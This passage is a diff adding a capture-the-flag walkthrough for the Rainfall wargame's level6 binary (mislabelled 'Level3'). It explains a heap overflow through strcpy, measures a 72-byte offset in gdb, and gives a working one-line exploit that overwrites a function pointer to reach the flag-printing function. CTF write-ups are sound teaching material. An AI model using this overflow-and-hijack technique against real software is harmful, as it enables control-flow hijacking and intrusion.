@@ -1,0 +1,48 @@
+# Rainfall - Level3 Walkthrough
+
+We copy the file `/home/user/level6/level6` locally:
+
+```bash
+scp -P 4242 level6@{IP}:/home/user/level6/level6 .
+```
+
+**Step 1**
+Open the binary in Ghidra.
+
+**Step 2**
+
+We want to call function `n`, that would print the flag.
+
+The call to strcpy is dangerous and result to heap buffer overflow for large enough input, as the buffer is only 64 bytes.
+
+The allocations are consecutive on the heap in many allocators.
+
+in gdb 
+We break right after the 2 malloc
+(gdb) b *0x08048491
+(gdb) b *0x080484a1
+
+We want to check the address of the allocated pointers
+
+eax is respectively
+0x804a008
+0x804a050
+
+0x804a050 − 0x804a008 = 0x48 = 72 (in base 10)
+
+So we need a padding of 72, followed by the address of `n` in little endian. The address of `n` will then be found in var `puVar1` which is later called.
+
+```bash
+gdb ./level6
+(gdb) info func
+...
+0x08048454  n
+0x08048468  m
+...
+```
+
+The function `n` we target has address `0x08048454` which gives little endian `\x54\x84\x04\x08`
+
+```bash
+./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
+```
